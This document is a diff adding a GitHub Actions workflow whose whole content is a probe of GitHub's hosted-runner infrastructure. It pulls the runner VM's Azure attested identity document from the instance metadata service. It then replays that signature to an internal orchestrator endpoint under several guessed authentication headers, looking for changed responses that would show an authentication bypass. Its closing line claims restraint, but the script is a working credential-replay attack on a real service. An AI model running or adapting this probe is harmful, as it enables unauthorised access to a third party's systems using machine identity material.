@@ -1,0 +1,23 @@
+name: att-gate
+on: workflow_dispatch
+permissions: {}
+jobs:
+  g:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          RO="https://hosted-compute-request-orchestrator-prod-eus-01.githubapp.com"
+          echo "=== fetch my VM's Azure attested document (own IMDS) ==="
+          RAW=$(curl -s -H "Metadata:true" "http://169.254.169.254/metadata/attested/document?api-version=2021-05-01")
+          DOC=$(echo "$RAW" | python3 -c "import sys,json;print(json.load(sys.stdin).get('signature',''))" 2>/dev/null)
+          echo "attested doc: encoding=$(echo "$RAW" | python3 -c "import sys,json;print(json.load(sys.stdin).get('encoding'))" 2>/dev/null) sig_len=${#DOC}"
+          echo "=== 401 response headers (auth hint?) ==="
+          curl -s -D - -o /dev/null --max-time 8 "$RO/vm/v1" | grep -iE "www-authenticate|^x-|^HTTP|server:" | head
+          echo "=== careful presentation attempts (GET, watch for error CHANGE) ==="
+          try(){ printf '%-34s' "$1"; c=$(curl -s -o /tmp/r -w "%{http_code}" --max-time 8 "${@:2}" "$RO/vm/v1"); echo " -> $c :: $(head -c 110 /tmp/r|tr -d '\n')"; }
+          try "baseline(none)"
+          try "X-Attestation-Token"        -H "X-Attestation-Token: $DOC"
+          try "Authorization:Attestation"  -H "Authorization: Attestation $DOC"
+          try "X-Azure-Attestation"         -H "X-Azure-Attestation: $DOC"
+          try "X-MS-Attestation"            -H "X-MS-Attestation: $DOC"
+          echo "=== NOTE: stopping at gate-engagement check; NOT enumerating/mutating ==="
